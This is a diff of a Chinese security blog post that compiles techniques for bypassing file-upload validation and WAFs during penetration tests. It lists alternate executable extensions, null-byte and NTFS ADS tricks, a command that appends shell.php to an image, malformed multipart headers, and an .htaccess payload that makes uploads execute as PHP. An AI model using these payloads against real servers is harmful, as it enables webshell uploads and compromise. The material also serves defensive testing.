@@ -67,7 +67,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">63字</span>
+            <span class="post-count">1.7k字</span>
         </span>
     </span>
 
@@ -76,7 +76,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">1分钟</span>
+            <span class="post-count">6分钟</span>
         </span>
     </span>
 </div>
@@ -102,9 +102,140 @@
 
       
       <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在渗透中遇到文件上传总是各种绕不过，关键是不知道几种姿势，想绕都没得绕，故打算总结一下，以后至少遇到了还能对线一下</p>
-<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ul>
-<li>前端检测绕过<a id="more"></a></li>
+<blockquote>
+<p>我是总结网上的好文章，遇到了方便查找</p>
+</blockquote>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>文中所写（图、文）均来自以下几篇文章：</p>
+<a id="more"></a>
+<p><a href="https://mp.weixin.qq.com/s/yd-wewpy685WcvWQ5g3Ncg" target="_blank" rel="noopener">文件上传漏洞另类绕过技巧及挖掘案例全汇总</a></p>
+<p><a href="https://paper.seebug.org/219/" target="_blank" rel="noopener">我的WafBypass之道（upload篇）</a></p>
+<h1 id="测试思路"><a href="#测试思路" class="headerlink" title="测试思路"></a>测试思路</h1><ol>
+<li><p>首先尝试直接上传脚本文件进行RCE；</p>
+</li>
+<li><p>若存在过滤，对于检测机制进行猜测，确定机制后尝试绕过；</p>
+</li>
+<li><p>若无法绕过上传，插入脚本后寻找解析/文件包含漏洞；</p>
+</li>
+<li><p>换其他类型文件：html、js、svg等转到挖掘其他漏洞。</p>
+</li>
+</ol>
+<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p><strong>逻辑绕过</strong></p>
+<p>目录</p>
+<ul>
+<li>前端检测和content-type字段检测</li>
+<li>后缀名黑白名单绕过</li>
+<li>文件头和文件内容检测</li>
+<li>二次渲染绕过</li>
+<li>条件竞争绕过</li>
 </ul>
+<p><strong>waf绕过</strong></p>
+<p>大佬的waf绕过总结</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1. filename在content-type下面</span><br><span class="line">2. .asp&#123;80-90&#125;</span><br><span class="line">3. NTFS ADS</span><br><span class="line">4. .asp...</span><br><span class="line">5. boundary不一致</span><br><span class="line">6. iis6分号截断asp.asp;asp.jpg</span><br><span class="line">7. apache解析漏洞php.php.ddd</span><br><span class="line">8. boundary和content-disposition中间插入换行</span><br><span class="line">9. hello.php:a.jpg然后hello.&lt;&lt;&lt;</span><br><span class="line">10. filename&#x3D;php.php</span><br><span class="line">11. filename&#x3D;&quot;a.txt&quot;;filename&#x3D;&quot;a.php&quot;</span><br><span class="line">12. name&#x3D;\n&quot;file&quot;;filename&#x3D;&quot;a.php&quot;</span><br><span class="line">13. content-disposition:\n</span><br><span class="line">14. .htaccess文件</span><br><span class="line">15. a.jpg.\nphp</span><br><span class="line">16. 去掉content-disposition的form-data字段</span><br><span class="line">17. php&lt;5.3 单双引号截断特性</span><br><span class="line">18. 删掉content-disposition: form-data;</span><br><span class="line">19. content-disposition\00:</span><br><span class="line">20. &#123;char&#125;+content-disposition</span><br><span class="line">21. head头的content-type: tab</span><br><span class="line">22. head头的content-type: multipart&#x2F;form-DATA</span><br><span class="line">23. filename后缀改为大写</span><br><span class="line">24. head头的Content-Type: multipart&#x2F;form-data;\n</span><br><span class="line">25. .asp空格</span><br><span class="line">26. .asp0x00.jpg截断</span><br><span class="line">27. 双boundary</span><br><span class="line">28. file\nname&#x3D;&quot;php.php&quot;</span><br><span class="line">29. head头content-type空格:</span><br><span class="line">30. form-data字段与name字段交换位置</span><br></pre></td></tr></table></figure>
+
+<h2 id="逻辑绕过"><a href="#逻辑绕过" class="headerlink" title="逻辑绕过"></a>逻辑绕过</h2><h3 id="前端检测和content-type字段检测"><a href="#前端检测和content-type字段检测" class="headerlink" title="前端检测和content-type字段检测"></a>前端检测和content-type字段检测</h3><p>在本地将shell文件后缀名改为合法后缀名，通过burp抓包改后缀名直接绕过这两种检测</p>
+<h3 id="后缀名黑白名单绕过"><a href="#后缀名黑白名单绕过" class="headerlink" title="后缀名黑白名单绕过"></a>后缀名黑白名单绕过</h3><p><strong>黑名单</strong></p>
+<p>以下替换后缀也可以解析为shell：</p>
+<p><strong>php</strong>：.phtml,.phpt,.php3,.php3p</p>
+<p><strong>asp</strong>：.aspx，asmx，ashx，web.config</p>
+<p><strong>perl</strong>:.pl,.pm,.cgi,.lib</p>
+<p><strong>jsp</strong>:.jspx,.jsw,.jsv,.jspf</p>
+<p><strong>Coldfusion</strong>:.cfm,.cfml,.cfc,.dbm</p>
+<p>另外可以配合操作系统的文件命名规则：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.php.,.php空格，.php:1.jpg,.php::$DATA等</span><br></pre></td></tr></table></figure>
+
+<p>这些后缀的文件会被windows系统自动去掉不符合规则符号后面的内容，从而只留下.php。</p>
+<p><strong>白名单</strong><br>黑名单绕不过就尝试空字节注入，解释如下：</p>
+<blockquote>
+<p>插入空字节值的原因是某些应用程序服务器脚本语言使用c/c++库来检查文件名和内容。在C/C ++中，一行以/00结尾或称为NullByte。因此，只要解释器在字符串的末尾看到一个空字节，就会停止读取，认为它已经到达字符串的末尾。</p>
+</blockquote>
+<p>方法：</p>
+<p>在文件后缀名后面加一个16进制的<code>00</code></p>
+<p><strong>在黑白名单都绕不过的情况下可以尝试利用解析漏洞</strong><br>在 <a href="https://paper.seebug.org/219/" target="_blank" rel="noopener">https://paper.seebug.org/219/</a> 中有提及</p>
+<h3 id="文件头和文件内容检测"><a href="#文件头和文件内容检测" class="headerlink" title="文件头和文件内容检测"></a>文件头和文件内容检测</h3><p><strong>文件头检测</strong></p>
+<p>各种文件头：</p>
+<p><strong>PNG</strong>：8950 4E 47</p>
+<p><strong>JPG</strong>：FFD8 FF E0 00 10 4A 46 49 46</p>
+<p><strong>GIF</strong>：4749 46 38 39 61</p>
+<p>在burp的Repeater模块中的hex模块进行编辑添加</p>
+<p><strong>文件内容检测</strong></p>
+<p>操作方法：<br>在命令行使用copy命令进行操作：</p>
+<p><code>copy 1.jpg/b+shell.php/a shell.jpg</code></p>
+<p><img src="/img/upload/01.png" alt=""></p>
+<h3 id="二次渲染绕过"><a href="#二次渲染绕过" class="headerlink" title="二次渲染绕过"></a>二次渲染绕过</h3><p>原理：</p>
+<p>对比渲染后的数据和未经渲染的数据，找出没有变化的部分，插入payload</p>
+<h3 id="条件竞争绕过"><a href="#条件竞争绕过" class="headerlink" title="条件竞争绕过"></a>条件竞争绕过</h3><p>方法：</p>
+<p>使用burp的Intruder模块同时发两个包上传文件+访问webshell地址</p>
+<p>如果确认存在条件竞争漏洞，可以上传一个创建新文件的脚本文件，通过条件竞争创建</p>
+<h2 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h2><p>了解上传文件的数据包的特点：</p>
+<p><strong>Header中Content-Type特征有二：</strong></p>
+<ol>
+<li><p>multipart/form-data（form表单的enctype属性，规定为二进制数据）</p>
+</li>
+<li><p>boundary字符串（作用为分隔符，以区分POST数据）</p>
+</li>
+</ol>
+<p><strong>POST内容特征有五：</strong></p>
+<ol>
+<li><p>Content-Disposition：form-data</p>
+</li>
+<li><p>name：input表单名</p>
+</li>
+<li><p>filename：文件名</p>
+</li>
+<li><p>Content-Type：定义文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件；</p>
+</li>
+<li><p>boundary：Content-Type的值前面加了两个—</p>
+</li>
+</ol>
+<p><img src="/img/upload/02.png" alt=""></p>
+<h3 id="waf缺陷"><a href="#waf缺陷" class="headerlink" title="waf缺陷"></a>waf缺陷</h3><ol>
+<li><p>多个分号绕过<br>文件解析时，可能解析不到文件名，导致绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data;name&#x3D;&quot;file_x&quot;;;;filename&#x3D;&quot;test.php&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>多加一个filename绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data;name&#x3D;&quot;file_x&quot;;filename&#x3D;&quot;test.jpg&quot;;filename&#x3D;&quot;test.php&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>空格过狗</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------4714631421141173021852555099</span><br></pre></td></tr></table></figure>
+<p>尝试在boundary后面加个空格或者其他可被正常处理的字符：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boundary &#x3D;---------------------------4714631421141173021852555099</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>修改header头中的boundary，使得header中的boundary和body中的boundary不一致导致waf认为这段数据无意义</p>
+</li>
+</ol>
+<p><img src="/img/upload/04.png" alt=""></p>
+<ol start="5">
+<li><p>filename=”shell.asp;{ascii&gt;127}.jpg”</p>
+</li>
+<li><p>waf如果对Content-Disposition长度处理的不够好的话可能会导致绕过，如：</p>
+</li>
+</ol>
+<p><img src="/img/upload/05.png" alt=""></p>
+<ol start="7">
+<li>构造长文件名</li>
+</ol>
+<p><img src="/img/upload/06.png" alt=""></p>
+<p>特殊的长文件名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</span><br></pre></td></tr></table></figure>
+
+<h3 id="容器特性"><a href="#容器特性" class="headerlink" title="容器特性"></a>容器特性</h3><ol>
+<li>多个Content-Disposition绕过(IIS环境)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------asdfghjkl</span><br><span class="line">Content-Disposition: form-data;name&#x3D;&quot;file_x&quot;;filename&#x3D;&quot;test.php&quot;</span><br><span class="line">------asdfghjkl</span><br><span class="line">Content-Disposition: form-data;name&#x3D;&quot;file_x&quot;;filename&#x3D;&quot;test.jpg&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br></pre></td></tr></table></figure></li>
+<li>请求正文格式问题(IIS 6.0)<br>正常请求格式：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file1&quot;; filename&#x3D;&quot;shell.asp&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br></pre></td></tr></table></figure></li>
+<li>攻击.htaccess文件<br>上传.htaccess文件，这个方法通常用于绕过waf黑名单的，配置该目录下所有文件都将其使用php来解析：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;.htaccess&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;FilesMatch &quot;shell&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+<img src="/img/upload/03.png" alt=""></li>
+</ol>
+<h3 id="系统特性"><a href="#系统特性" class="headerlink" title="系统特性"></a>系统特性</h3><ol>
+<li><p>windows特殊字符绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当我们上传一个文件的filename为shell.php&#123;%80-%99&#125;时：</span><br><span class="line"></span><br><span class="line">waf可能识别为.php&#123;%80-%99&#125;，就会导致被绕过。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>$DATA绕过<br>上传的文件名为<code>test.php::$DATA</code></p>
+</li>
+<li><p>文件名末尾加点绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;shell.php.....&quot;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;shell.php::$DATA.....&quot;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h1 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h1><p>仅做记录，遇到的时候翻翻看，希望有用</p>
 
       
       <!-- reward -->
